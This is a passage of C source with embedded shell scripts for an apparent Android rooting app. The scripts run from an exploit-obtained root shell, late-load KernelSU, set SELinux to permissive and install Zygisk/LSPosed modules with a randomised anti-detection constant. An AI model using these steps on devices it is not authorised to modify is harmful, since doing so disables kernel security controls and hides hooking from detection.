            "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
            "if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then\n"
            "  echo '[!] cannot parse KMI from uname -r' >>\"$LOG\"\n"
            "  exit 1\n"
            "fi\n"
            "KMI=\"${AVER}-${KVER}\"\n"
            "# safe mode: disable all modules before exec ksud\n"
            "if [ \"$SAFE_MODE\" = \"1\" ]; then\n"
            "  echo \"[*] safe mode: disabling all modules under /data/adb/modules\" >>\"$LOG\"\n"
            "  n=0\n"
            "  for m in /data/adb/modules/*/; do\n"
            "    [ -d \"$m\" ] || continue\n"
            "    if touch \"${m}disable\" 2>/dev/null; then\n"
            "      n=$((n+1))\n"
            "      echo \"  disabled ${m}\" >>\"$LOG\"\n"
            "    fi\n"
            "  done\n"
            "  echo \"[*] safe mode: $n module(s) disabled\" >>\"$LOG\"\n"
            "fi\n"
            "# step 1: restore policy\n"
            "POLICY=$(mktemp \"$HOME_DIR/.ghostlock_policy.XXXXXX\") || {\n"
            "  echo '[!] cannot create policy dump' >>\"$LOG\"\n"
            "  exit 1\n"
            "}\n"
            "trap 'rm -f \"$POLICY\"; dump_debug' EXIT\n"
            "prepare_policy() {\n"
            "  cat /sys/fs/selinux/policy >\"$POLICY\" || return 1\n"
            "  HEADER=$(od -An -tx1 -N24 \"$POLICY\" | tr -d ' \\n')\n"
            "  case \"$HEADER\" in\n"
            "    8cff7cf9080000005345204c696e7578\?\?\?\?\?\?\?\?\?\?\?\?\?\?\?\?) ;;\n"
            "    *) echo '[!] invalid policy header'; return 1 ;;\n"
            "  esac\n"
            "  # Restore missing Android netlink flags: bits 30/31, byte 23.\n"
            "  CONFIG=$(od -An -tu1 -j23 -N1 \"$POLICY\") || return 1\n"
            "  [ -n \"$CONFIG\" ] || return 1\n"
            "  CONFIG=$(printf '\\\\0%%03o' \"$((CONFIG | 192))\" || return 1)\n"
            "  printf '%%b' \"$CONFIG\" | dd of=\"$POLICY\" bs=1 seek=23 count=1 conv=notrunc\n"
            "}\n"
            /* Phase 2 of a two-step run: root already loaded KernelSU and left a
             * working ksud, so the whole prologue below (policy reload ->
             * late-load -> re-enforce) only repeats what is already true.
             *
             * The module check cannot be the gate. The root phase ends with
             * SELinux back in enforcing, and this script then runs from an
             * authorized su whose domain cannot read /proc/modules either, so
             * a grep there fails even though the module is loaded and su is
             * live. Gating on it re-ran the late-load against a loaded module,
             * which is the re-enforce path that panics. Reaching this script
             * as root with a runnable ksud is itself the proof that KernelSU is
             * already in memory. */
            "PROLOGUE_SKIP=0\n"
            "if [ \"$PHASE\" = \"activate\" ] && [ -x \"$KSUD\" ] && [ \"$(id -u 2>/dev/null)\" = \"0\" ]; then\n"
            "  PROLOGUE_SKIP=1\n"
            "  echo '[*] phase=activate as root with ksud; skipping policy fixup and late-load' >>\"$LOG\"\n"
            "  # Root left inet labels unlabeled: wlan0 packets then hit\n"
            "  # 'avc: denied { ingress } scontext=...:unlabeled:s0' and every reply is\n"
            "  # dropped. load_policy was tried (2026-11-10) to re-initialise label\n"
            "  # slots, but reloading the whole live policy invalidates\n"
            "  # system_server's context mid-run; MTK hang_detect fires sysrq\n"
            "  # kill-all -> reboot (measured 2026-11-11, pstore: Hang_Detect 5:5\n"
            "  # then sysrq Kill All Tasks at t=183s). setenforce 0 is sufficient:\n"
            "  # denials are logged but not enforced, so ingress traffic flows.\n"
            "  # Enforcing is restored by the reboot finisher after Vector is\n"
            "  # verified, or by reboot if the finisher never runs.\n"
            "  echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
            "  echo '[*] activate: setenforce 0 (permissive for network + Vector)' >>\"$LOG\"\n"
            "fi\n"
            "FIXUP_RC=1\n"
            "if [ \"$SELINUX_FIXUP\" = \"1\" ] && [ \"$PROLOGUE_SKIP\" != \"1\" ]; then\n"
            "for i in $(seq 1 10); do\n"
            "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
            "  if ! prepare_policy >>\"$LOG\" 2>&1; then\n"
            "    sleep 2\n"
            "    continue\n"
            "  fi\n"
            "  BEFORE_POLICYLOAD=$(od -An -tu4 -j12 -N4 /sys/fs/selinux/status 2>/dev/null | tr -d ' ')\n"
            "  load_policy \"$POLICY\" >>\"$LOG\" 2>&1 &\n"
            "  LPID=$!\n"
            "  (sleep 8; kill -9 $LPID 2>/dev/null) &\n"
            "  SPID=$!\n"
            "  wait $LPID 2>/dev/null\n"
            "  FIXUP_RC=$?\n"
            "  kill $SPID 2>/dev/null\n"
            "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
            "    AFTER_POLICYLOAD=$(od -An -tu4 -j12 -N4 /sys/fs/selinux/status 2>/dev/null | tr -d ' ')\n"
            "    echo \"[*] policyload before=$BEFORE_POLICYLOAD after=$AFTER_POLICYLOAD\" >>\"$LOG\"\n"
            "    if [ -n \"$AFTER_POLICYLOAD\" ] && [ \"$AFTER_POLICYLOAD\" != \"$BEFORE_POLICYLOAD\" ]; then\n"
            "      break\n"
            "    fi\n"
            "    echo '[!] load_policy returned success without updating SELinux status' >>\"$LOG\"\n"
            "    FIXUP_RC=1\n"
            "  fi\n"
            "  sleep 2\n"
            "done\n"
            "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
            "else\n"
            "  FIXUP_RC=2\n"
            "  if [ \"$PROLOGUE_SKIP\" = \"1\" ]; then\n"
            "    echo '[*] policy reload skipped (prologue skipped)' >>\"$LOG\"\n"
            "  else\n"
            "    echo '[*] policy reload skipped (SELINUX_FIXUP=0)' >>\"$LOG\"\n"
            "  fi\n"
            "fi\n"
            "if [ \"$FIXUP_RC\" -eq 0 ] || [ \"$FIXUP_RC\" -eq 2 ]; then\n"
            "# load_policy ok: late-load (module init re-enforces); already-loaded restores below\n"
            "# Late-load is deferred to the end of the run in the app route\n"
            "# (SELINUX_FIXUP=0): ksud late-load kills zygote as part of KSU's\n"
            "# injection, and doing that before module install would kill the\n"
            "# root script. Module install now extracts zips manually into\n"
            "# /data/adb/modules_update, bypassing ksud's UAPI check, so it\n"
            "# works before late-load loads kernelsu.ko.\n"
            "if [ \"$SELINUX_FIXUP\" = \"1\" ] && [ \"$PROLOGUE_SKIP\" != \"1\" ]; then\n"
            "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
            "  KSU_ALREADY=1\n"
            "  echo \"[*] kernelsu loaded but su missing; re-running late-load to mount su\" >>\"$LOG\"\n"
            "  chmod 755 \"$KSUD\" 2>/dev/null\n"
            "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
            "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
            "else\n"
            "  KSU_ALREADY=0\n"
            "  if [ ! -x \"$KSUD\" ]; then\n"
            "    echo '[!] ksud missing; cannot late-load' >>\"$LOG\"\n"
            "    exit 1\n"
            "  fi\n"
            "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
            "  chmod 755 \"$KSUD\" 2>/dev/null\n"
            "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
            "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
            "fi\n"
            "echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
            "KSU_READY=0\n"
            "for i in $(seq 1 50); do\n"
            "  if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
            "  sleep 0.1\n"
            "done\n"
            "if [ \"$KSU_READY\" -ne 1 ]; then\n"
            "  echo '[!] KernelSU module not loaded' >>\"$LOG\"\n"
            "  exit 1\n"
            "fi\n"
            "echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
            "else\n"
            "  KSU_ALREADY=0\n"
            /* KernelSU is already loaded and owns selinux policy; re-enforcing
             * here switches the shell from permissive to enforcing mid-run, and
             * the shell's context (shell:s0) then loses write access to the
             * app_data_file log/status, blinding the rest of the script. Let
             * KernelSU manage enforcing and keep running under the live state. */
            "  ENFORCE=$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
            "  echo \"[*] prologue skipped; selinux enforce=$ENFORCE\" >>\"$LOG\"\n"
            /* The skipped block is where the debug-dump trap gets installed;
             * without it a failure before the finisher leaves no dump. */
            "  trap dump_debug EXIT\n"
            "fi\n"
            "if [ \"$KSU_ALREADY\" -eq 1 ] && [ \"$SELINUX_FIXUP\" = \"1\" ]; then\n"
            "  echo \"[*] kernelsu already loaded; restoring enforcing\" >>\"$LOG\"\n"
            "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
            "fi\n"
            "STATE=root; write_status\n"
            /* Re-running activate on a device that is already up must not
             * reinstall modules or kill zygote again: this exit code is what
             * the app reads as "Vector is active", and a second zygote restart
             * would kill the app for no reason. Require both the injection
             * record and a live CLI before trusting it. */
            "if [ \"$PHASE\" = \"activate\" ] && [ -f /data/adb/rezygisk/state.json ] && \\\n"
            "   /system/bin/grep -q zygisk_vector /data/adb/rezygisk/state.json && \\\n"
            "   /system/bin/grep -q '\"64\": 1' /data/adb/rezygisk/state.json && \\\n"
            "   timeout 15 /data/adb/modules/zygisk_vector/cli status 2>/dev/null | /system/bin/grep -q 'Framework Version'; then\n"
            "  STATE=ready; BUSY=0; READY=1; ERROR=; write_status\n"
            "  echo '[*] activation already verified; no reinstall, no zygote restart' >>\"$LOG\"\n"
            "  exit 0\n"
            "fi\n"
            "if [ -n \"$LSPD_MODULES\" ]; then\n"
            "  STATE=installing; write_status\n"
            "  MODZIP_DIR=\"$LSPD_MODULES\"\n"
            "  echo \"[*] modules dir=$MODZIP_DIR\" >>\"$LOG\"\n"
            "  KSU_KSUD=/data/adb/ksu/bin/ksud\n"
            "  if [ ! -x \"$KSU_KSUD\" ]; then\n"
            "    if [ -x /data/local/tmp/.ghostlock_ksud ]; then\n"
            "      KSU_KSUD=/data/local/tmp/.ghostlock_ksud\n"
            "    elif [ -x \"$KSUD\" ]; then\n"
            "      KSU_KSUD=\"$KSUD\"\n"
            "    fi\n"
            "    echo \"[*] installed ksud missing; using $KSU_KSUD\" >>\"$LOG\"\n"
            "  fi\n"
            /* The exploit's uid-0 child runs in an SELinux domain where
             * KernelSU hides /data/adb/modules, and where toybox refuses to
             * exec at all (even /system/bin/id and /system/bin/ls come back as
             * "inaccessible"). nsenter into init's mount namespace does not
             * help: the hide is per-domain, not per-mount-namespace. Only the
             * KSU su domain can read the modules, so prefer that whenever su
             * works, even though we are already uid 0. */
            /* su is conjured by a KSU execve hook, so `[ -x ]`, `stat` and
             * even `open` report ENOENT while a plain exec still works. It
             * must be picked on a trial run, never on a stat. */
            "  SU=''\n"
            "  export PATH=/system/bin:/system/xbin:/data/adb/ksu/bin\n"
            "  for cand in /system/bin/su /system/xbin/su; do\n"
            "    SUOUT=$(\"$cand\" -c 'echo ghostlock-su-ok' 2>&1)\n"
            "    echo \"[*] su probe: $cand -> [$SUOUT]\" >>\"$LOG\"\n"
            "    case \"$SUOUT\" in *ghostlock-su-ok*) SU=\"$cand\"; break;; esac\n"
            "  done\n"
            "  echo \"[*] uid=$(id -u) su=${SU:-none} domain=$(cat /proc/self/attr/current 2>&1)\" >>\"$LOG\"\n"
            /* Runs a command with the privileges the module scripts need.
             * Three ways into a domain that can write /data/adb, in order.
             *
             *  1. /system/bin/su — not a real file (a KSU execve hook conjures
             *     it), so `stat` and `[ -x ]` always say it is missing while a
             *     plain exec still works. Never gate it on a stat.
             *  2. setexeccon — late-load installs a ksu policy whose ksu
             *     domain is permissive, and the exploit shell is uid 0, so
             *     writing u:r:ksu:s0 to attr/exec can be enough where su is
             *     not reachable. Needs CAP_MAC_ADMIN in the current domain;
             *     the write simply fails when it does not have it.
             *  3. run in place — works for the module extraction (it only
             *     writes /data/adb/modules, whose label this domain owns), but
             *     not for the daemon's mkdir /data/adb/rezygisk.
             *
             * ksud is not an option: in late-load mode ksuctl is not wired up
             * ("ksuctl failed: Operation not permitted" / "No such process"),
             * so every ksud subcommand needing the driver fails, while
             * `late-load` works because it only insmods. nsenter is not an
             * option either: it changes the mount namespace but not the
             * domain, so toybox in the module's post-fs-data.sh stays
             * unexecutable. */
            /* Every branch needs an explicit PATH: the module scripts call
             * plain `which`/`rm`/`getprop`, and this shell is not a login
             * shell, so an empty PATH makes toybox report
             * "<cmd>: inaccessible or not found" even when the binary is
             * reachable. */
            "  export PATH=/system/bin:/system/xbin:/data/adb/ksu/bin\n"
            "  run_root() {\n"
            "    if [ -n \"$SU\" ]; then\n"
            "      \"$SU\" -c \"$1\"; return $?\n"
            "    fi\n"
            /* Record the write, not just its effect: a rejected setexeccon is
             * what decides whether this fallback is dead or merely untried. */
            "    AERR=$( (printf 'u:r:ksu:s0' >/proc/self/attr/exec) 2>&1 )\n"
            "    if [ -z \"$AERR\" ]; then\n"
            "      echo \"[*] run_root: attr/exec=u:r:ksu:s0 ok, domain=$(cat /proc/self/attr/current 2>&1)\" >>\"$LOG\"\n"
            "      sh -c \"$1\"; return $?\n"
            "    fi\n"
            "    echo \"[*] run_root: attr/exec write failed: [$AERR] domain=$(cat /proc/self/attr/current 2>&1)\" >>\"$LOG\"\n"
            /* Third option is real, not a formality: measured on this target,
             * u:r:kernel:s0 under permissive CAN exec toybox, CAN read
             * /data/adb (stat reports 700 0 0) and CAN write it (the managed
             * marker lands). What it cannot do is reach a path only the ksu
             * domain may touch. Refusing to run here - as an earlier revision
             * did - made the install step fail unconditionally even in runs
             * where this branch would have worked. */
            "    echo '[*] run_root: falling through to run-in-place in the current domain' >>\"$LOG\"\n"
            "    sh -c \"$1\"\n"
            "  }\n"
            /* Same trap: su is never `-x` from this domain, so pick it on a
             * trial run rather than on a stat. Both candidate paths are the
             * same KSU hook. */
            "  probe_su() {\n"
            "    for cand in /system/bin/su /system/xbin/su; do\n"
            "      [ -n \"$cand\" ] || continue\n"
            "      if \"$cand\" -c 'echo ghostlock-su-ok' 2>/dev/null | /system/bin/grep -q ghostlock-su-ok; then\n"
            "        SU=\"$cand\"; echo \"[*] su usable: $cand\" >>\"$LOG\"; return 0\n"
            "      fi\n"
            "      echo \"[*] su probe: $cand unusable\" >>\"$LOG\"\n"
            "    done\n"
            "    echo '[*] su absent' >>\"$LOG\"; return 1\n"
            "  }\n"
            /* Load kernelsu.ko before touching /data/adb, not after.
             * late-load is what installs the ksu policy; until it runs,
             * attr/exec=u:r:ksu:s0 is refused with EPERM and run_root() falls
             * through to "run in place", which is the domain that cannot
             * even exec toybox. Doing it after the install meant every
             * /data/adb write in the install step ran in that dead domain. */
            "  if ! grep -q kernelsu /proc/modules 2>/dev/null; then\n"
            "    echo '[*] late-load (early, installs ksu policy)' >>\"$LOG\"\n"
            "    \"$KSU_KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
            "    echo \"[*] early late-load exit=$? kernelsu=$(grep -c kernelsu /proc/modules 2>/dev/null)\" >>\"$LOG\"\n"
            "  fi\n"
            /* late-load is what makes the KSU su hook live, so the probe that
             * ran before it can only have failed. Re-probe now; on success
             * run_root() dispatches through su (u:r:ksu:s0) instead of the
             * attr/exec fallback.
             *
             * Measured on this target: ksud late-load returns exit=0 before the
             * module is visible in /proc/modules, and su appears even later
             * (the ksu policy + su hook need extra seconds to settle). A 30s
             * poll caught neither; bumping to 120s and waiting for the module
             * first (cheap, no exec) before probing su avoids the false "su
             * absent" that pinned every run to the wrong domain. */
            "  if [ -z \"$SU\" ]; then\n"
            "    i=0\n"
            "    while [ \"$i\" -lt 120 ]; do\n"
            "      grep -q kernelsu /proc/modules 2>/dev/null && break\n"
            "      i=$((i + 1)); sleep 1\n"
            "    done\n"
            "    echo \"[*] kernelsu visible after ${i}s\" >>\"$LOG\"\n"
            "    i=0\n"
            "    while [ \"$i\" -lt 60 ]; do\n"
            "      probe_su >/dev/null 2>&1 && break\n"
            "      i=$((i + 1)); sleep 1\n"
            "    done\n"
            "    echo \"[*] post-late-load su=${SU:-none} waited=${i}s domain=$(cat /proc/self/attr/current 2>&1)\" >>\"$LOG\"\n"
            "  fi\n"
            "  touch /data/local/tmp/.ghostlock_vector_managed 2>/dev/null\n"
            "  chown 2000:2000 /data/local/tmp/.ghostlock_vector_managed 2>/dev/null\n"
            "  if [ ! -x \"$KSU_KSUD\" ]; then\n"
            "    echo \"[!] installed ksud missing ($KSU_KSUD); skipping LSPosed stack\" >>\"$LOG\"\n"
            "    STATE=failed; BUSY=0; READY=0; ERROR='installed ksud missing'; write_status\n"
            "  else\n"
            /* Vector ships SKIPUNZIP=1: its customize.sh is the only thing
             * that turns the zip's lib/<abi>/libzygisk.so into the
             * zygisk/<abi>.so that rezygisk scans for, renames the per-ABI
             * dex2oat/oat-hook binaries, and rewrites the anti-detection
             * constant baked into daemon.apk. A bare unzip leaves none of
             * that in place, rezygisk then reports modules:[] and the zygote
             * restart injects nothing useful.
             *
             * Running the real installer would mean reimplementing the
             * Magisk environment it assumes (ui_print, abort, extract with
             * sha256 verification, ARCH/IS64BIT/API globals). The three
             * conversions below are Vector's on-disk layout contract, so
             * binding to them directly is both smaller and easier to reason
             * about than emulating an installer.
             *
             * rezygisk needs none of this: its zip already carries
             * bin/zygisk-ptrace64 and bin/zygiskd64 under their final names,
             * and its customize.sh would abort without a full KernelSU env.
             * The guard keys on the Vector-only mkdir, so only Vector runs. */

            /* Vector's on-disk layout contract, in one place. Written before
             * the install script below because that script invokes it; bump
             * these three conversions only when vector.zip's customize.sh
             * changes what it produces. */
            "    cat >/data/local/tmp/.ghostlock_vector_layout.sh <<'VZEOF'\n"
            "#!/system/bin/sh\n"
            "# No set -e: the guarded copies below are legitimately false when an\n"
            "# ABI or file is absent, and set -e would abort on that.\n"
            "d=\"$1\"\n"
            "MAGIC='5291374ceda0aef7c5d86cd2a4f6a3ac'\n"
            "abis=$(/system/bin/getprop ro.product.cpu.abilist 2>/dev/null)\n"
            "[ -n \"$abis\" ] || abis=$(/system/bin/getprop ro.system.product.cpu.abilist 2>/dev/null)\n"
            "[ -n \"$abis\" ] || abis='arm64-v8a,armeabi-v7a'\n"
            "mkdir -p \"$d/zygisk\"\n"
            "for a in $(echo \"$abis\" | /system/bin/tr ',' ' '); do\n"
            "  [ -f \"$d/lib/$a/libzygisk.so\" ] && /system/bin/cp -f \"$d/lib/$a/libzygisk.so\" \"$d/zygisk/$a.so\"\n"
            "done\n"
            "# customize.sh keeps one dex2oat pair per ABI width, 64-bit winning\n"
            "# when the device supports it.\n"
            "case \"$abis\" in *arm64-v8a*) A64=arm64-v8a ;; *x86_64*) A64=x86_64 ;; *) A64= ;; esac\n"
            "case \"$abis\" in *armeabi-v7a*) A32=armeabi-v7a ;; *x86*) A32=x86 ;; *) A32= ;; esac\n"
            "if [ -n \"$A32\" ] && [ \"$A32\" != \"$A64\" ] && [ -f \"$d/bin/$A32/dex2oat\" ]; then\n"
            "  /system/bin/cp -f \"$d/bin/$A32/dex2oat\" \"$d/bin/dex2oat32\"\n"
            "  /system/bin/cp -f \"$d/bin/$A32/liboat_hook.so\" \"$d/bin/liboat_hook32.so\"\n"
            "fi\n"
            "if [ -n \"$A64\" ] && [ -f \"$d/bin/$A64/dex2oat\" ]; then\n"
            "  /system/bin/cp -f \"$d/bin/$A64/dex2oat\" \"$d/bin/dex2oat64\"\n"
            "  /system/bin/cp -f \"$d/bin/$A64/liboat_hook.so\" \"$d/bin/liboat_hook64.so\"\n"
            "fi\n"
            "# Anti-detection: Vector replaces this constant with 32 chars drawn\n"
            "# from [a-z0-9]. Match that exactly: the string is length-checked\n"
            "# downstream, daemon.apk gets every occurrence replaced while each\n"
            "# dex2oat only gets its first.\n"
            "dev=$(/system/bin/tr -dc 'a-z0-9' </dev/urandom | /system/bin/head -c 32)\n"
            "if [ -f \"$d/daemon.apk\" ]; then\n"
            "  /system/bin/sed -i \"s/$MAGIC/$dev/g\" \"$d/daemon.apk\" 2>/dev/null\n"
            "fi\n"
            "for f in \"$d/bin/dex2oat32\" \"$d/bin/dex2oat64\"; do\n"
            "  [ -f \"$f\" ] && /system/bin/sed -i \"s/$MAGIC/$dev/\" \"$f\" 2>/dev/null\n"
            "done\n"
            "VZEOF\n"
            "    chown 2000:2000 /data/local/tmp/.ghostlock_vector_layout.sh 2>/dev/null\n"
            "    cat >/data/local/tmp/.ghostlock_modinstall.sh <<'MODINSTEOF'\n"
            "#!/system/bin/sh\n"
            /* Runs as its own sh process through run_root, so it does not
             * inherit LOG from the caller. Without this every append to $LOG
             * below is an empty redirect and the install log vanishes. */
            "LOG='/data/user/0/com.ghostlock.app/files/.ghostlock_ksu.log'\n"
            "MODDIR=\"$1\"\n"
            "rm -rf /data/adb/modules/zygisk_vector /data/adb/modules/rezygisk /data/adb/modules_update/zygisk_vector /data/adb/modules_update/rezygisk\n"
            "for z in \"$MODDIR\"/*.zip; do\n"
            "  [ -f \"$z\" ] || continue\n"
            "  echo \"[*] extracting module $z\"\n"
            "  # ksud module install checks the kernel UAPI version, which is 0\n"
            "  # before late-load loads kernelsu.ko. Extract manually instead:\n"
            "  # the module files land in /data/adb/modules_update and the late-load\n"
            "  # that runs afterwards picks them up.\n"
            "  name=$(/system/bin/unzip -p \"$z\" module.prop 2>/dev/null | /system/bin/sed -n \"s/^id=//p\" | /system/bin/head -1)\n"
            "  [ -n \"$name\" ] || continue\n"
            "  /system/bin/mkdir -p /data/adb/modules_update/$name\n"
            "  cd /data/adb/modules_update/$name && /system/bin/unzip -o \"$z\" && cd /\n"
            "  # unzip does not restore the archive's executable bits, so every\n"
            "  # module script and binary lands 0644. rezygisk then cannot exec\n"
            "  # post-fs-data.sh and Vector cannot run daemon/cli, both failing\n"
            "  # with EACCES under an otherwise correct install. Restore the\n"
            "  # bits the zip carried, then make the known entry points\n"
            "  # executable regardless of what the archive recorded.\n"
            "  /system/bin/find /data/adb/modules_update/$name -type f \\\n"
            "    \\( -name '*.sh' -o -path '*/bin/*' -o -name 'machikado.*' \\\n"
            "       -o -name 'cli' -o -name 'daemon' \\) \\\n"
            "    -exec /system/bin/chmod 755 {} + 2>/dev/null\n"
            /* Vector ships SKIPUNZIP=1, so a bare unzip leaves none of the
             * files rezygisk scans for. .ghostlock_vector_layout.sh above
             * performs the same three conversions its customize.sh does.
             * Guarded on the Vector-only mkdir so rezygisk - which already
             * carries bin/zygisk-ptrace64 under its final name - is skipped. */
            "  if /system/bin/grep -q 'mkdir -p \"$MODPATH/zygisk\"' /data/adb/modules_update/$name/customize.sh 2>/dev/null; then\n"
            "    sh /data/local/tmp/.ghostlock_vector_layout.sh /data/adb/modules_update/$name >>\"$LOG\" 2>&1\n"
            "    echo \"[*] vector layout for $name rc=$? zygisk=$(ls /data/adb/modules_update/$name/zygisk 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
            "  fi\n"
            "  # post-fs-data.d/rezygisk.sh restores module.prop from this backup\n"
            "  # and dies under `set -e` when it is absent, which is the case on\n"
            "  # every fresh install. Seed it here, before the module is moved\n"
            "  # into /data/adb/modules, where we can still write it.\n"
            "  [ -f /data/adb/modules_update/$name/module.prop.bak ] || /system/bin/cp /data/adb/modules_update/$name/module.prop /data/adb/modules_update/$name/module.prop.bak\n"
            "  echo \"[*] extracted $name -> /data/adb/modules_update/$name\"\n"
            "done\n"

            /* G0: a bare unzip of Vector leaves no zygisk/<abi>.so, rezygisk
             * then reports modules:[] and the zygote restart below injects
             * nothing useful. Refuse to go any further: the restart is the
             * step that takes the device to recovery, so it must never run on
             * a layout that cannot work. Distinguish this from a plain
             * install failure with its own exit code. */
            "if [ -d /data/adb/modules_update/zygisk_vector ]; then\n"
            "  ZSO=$(ls /data/adb/modules_update/zygisk_vector/zygisk/*.so 2>/dev/null | wc -l)\n"
            "  echo \"[*] G0 zygisk libs=$ZSO $(ls /data/adb/modules_update/zygisk_vector/zygisk 2>/dev/null | tr '\\n' ' ')\"\n"
            "  if [ \"$ZSO\" -lt 1 ]; then\n"
            "    echo '[!] G0 failed: no zygisk/<abi>.so in zygisk_vector; not touching zygote'\n"
            "    exit 3\n"
            "  fi\n"
            "fi\n"
            "MODINSTEOF\n"
            "    chown 2000:2000 /data/local/tmp/.ghostlock_modinstall.sh 2>/dev/null\n"
            "    run_root \"sh /data/local/tmp/.ghostlock_modinstall.sh \"$LSPD_MODULES\" \"$KSU_KSUD\"\" >>\"$LOG\" 2>&1\n"
            "    MOD_RC=$?\n"
            "    echo \"[*] module install step finished rc=$MOD_RC\" >>\"$LOG\"\n"
            "    if [ $MOD_RC -eq 3 ]; then\n"
            "      STATE=failed; BUSY=0; READY=0; ERROR='G0: zygisk_vector has no zygisk/<abi>.so'; write_status\n"
            "      echo 'op:activation fail: G0 module layout invalid; zygote untouched' >>\"$LOG\"\n"
            "      exit 1\n"
            "    fi\n"
            "    if [ $MOD_RC -ne 0 ]; then\n"
            "      STATE=failed; BUSY=0; READY=0; ERROR='module install failed'; write_status\n"
            "      echo 'op:activation fail: module install failed' >>\"$LOG\"\n"
            "      exit 1\n"
            "    fi\n"
            "    chmod 755 /data/adb/modules/zygisk_vector/daemon /data/adb/modules/zygisk_vector/cli 2>/dev/null\n"
            "    chmod 755 /data/adb/modules/rezygisk/bin/* 2>/dev/null\n"
            "    STATE=applying; write_status\n"
            /* Re-run late-load so the just-installed modules are picked up, but
             * only when the module is not in memory yet. The early late-load
             * above (or an already-running KernelSU) already did this, and
             * repeating it kills zygote again mid-injection — the instability
             * this route kept hitting. See titan2-recovery-incident-2026-10-22.md:
             * "apply 的 late-load 只执行一次". */
            "    if ! grep -q kernelsu /proc/modules 2>/dev/null; then\n"
            "      echo '[*] late-load (apply modules)' >>\"$LOG\"\n"
            "      run_root \"$KSU_KSUD late-load --kmi $KMI --allow-shell\" >>\"$LOG\" 2>&1\n"
            "      echo \"[*] late-load exit=$? kernelsu=$(grep -c kernelsu /proc/modules 2>/dev/null)\" >>\"$LOG\"\n"
            "    else\n"
            "      echo \"[*] late-load skipped: kernelsu already in /proc/modules\" >>\"$LOG\"\n"
            "    fi\n"
            /* ksud only promotes modules_update on a real boot, not on a
             * late-load into an already-running kernel, so post-fs-data.sh never
             * exists and the daemon cannot start. Move them ourselves. The
             * update_dir flag would make ksud re-run the installer, so drop it. */
            "    for m in /data/adb/modules_update/*; do\n"
            "      [ -d \"$m\" ] || continue\n"
            "      n=$(basename \"$m\")\n"
            "      rm -rf \"/data/adb/modules/$n\"\n"
            "      mv \"$m\" \"/data/adb/modules/$n\" 2>>\"$LOG\"\n"
            "      rm -f \"/data/adb/modules/$n/update\"\n"
            "      echo \"[*] promoted module $n\" >>\"$LOG\"\n"
            "    done\n"
            "    chmod 755 /data/adb/modules/zygisk_vector/daemon /data/adb/modules/zygisk_vector/cli 2>/dev/null\n"
            "    chmod 755 /data/adb/modules/rezygisk/bin/* 2>/dev/null\n"
            /* late-load is what creates /data/adb/ksu/bin/ksud and mounts su, so
             * both the ksud path resolved above and the su probe are stale by
             * now: the ksud fallback was the apk's libksud (not executable from
             * this domain, exit 126) and SU was empty. Re-resolve both. */
            "    if [ -x /data/adb/ksu/bin/ksud ]; then KSU_KSUD=/data/adb/ksu/bin/ksud; fi\n"
            "    echo \"[*] ksud now=$KSU_KSUD\" >>\"$LOG\"\n"
            "    probe_su\n"
            "    echo \"[*] su now=${SU:-none}\" >>\"$LOG\"\n"
            "    echo '[*] starting zygisk daemon (post-fs-data)' >>\"$LOG\"\n"
            /* Rezygisk's own post-fs-data.sh is what starts the ptrace monitor,
             * resets /data/adb/rezygisk, sets the SELinux label and picks the
             * right ABI — running it beats reimplementing it. It needs a shell
             * outside the app sandbox: the exploit's uid-0 child inherits the
             * app's mount namespace, where /data/adb/modules is not visible and
             * `cd` into it fails, so the module's own script cannot run there.
             * `late-load --allow-shell` installs /system/bin/su in u:r:ksu:s0,
             * which does see the module tree and is what we use. `ksud debug su
             * -g` is the fallback for a late-load that mounted su elsewhere, but
             * it needs the kernelsu driver fd, which is not up yet on this
             * device, so it is only ever a second choice.
             * module.prop.bak is seeded during extraction so the module's own
             * `set -e` does not abort on a fresh install. */
            /* late-load ends with the kernel re-enforcing SELinux, and in
             * enforcing the exploit's u:r:kernel:s0 shell can neither exec its
             * own scratch scripts nor switch domain (measured: attr/exec returns
             * EPERM, running a script in /data/local/tmp returns EACCES). Drop
             * enforcement for the length of this one call and put it back — the
             * module script needs to mkdir/chcon /data/adb/rezygisk, and it is
             * the only thing in this run that must happen outside enforcing. */
            "    ENF_SAVED=$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
            "    echo 0 > /sys/fs/selinux/enforce 2>>\"$LOG\"\n"
            "    echo \"[*] enforce before pfd: saved=$ENF_SAVED now=$(cat /sys/fs/selinux/enforce 2>&1)\" >>\"$LOG\"\n"
            /* The module script runs under `set -e` and its first real step is
             * `rm -rf /data/adb/rezygisk`; when that fails the monitor is never
             * launched. Probe ownership/DAC here so a failure names its cause,
             * and clear the tree from this shell first when it can. */
            "    echo \"[*] pre-clean: $(ls -ldZ /data/adb/rezygisk 2>&1) id=$(id 2>&1)\" >>\"$LOG\"\n"
            "    chmod -R 755 /data/adb/rezygisk 2>>\"$LOG\"\n"
            "    rm -rf /data/adb/rezygisk 2>>\"$LOG\"; PCRC=$?\n"
            "    echo \"[*] pre-clean rc=$PCRC left=$(ls -d /data/adb/rezygisk 2>&1)\" >>\"$LOG\"\n"
            "    touch /data/adb/.gl_probe 2>>\"$LOG\"; echo \"[*] probe /data/adb write rc=$?\" >>\"$LOG\"\n"
            "    rm -f /data/adb/.gl_probe 2>>\"$LOG\"; echo \"[*] probe /data/adb unlink rc=$?\" >>\"$LOG\"\n"
            "    PFD_RC=0\n"
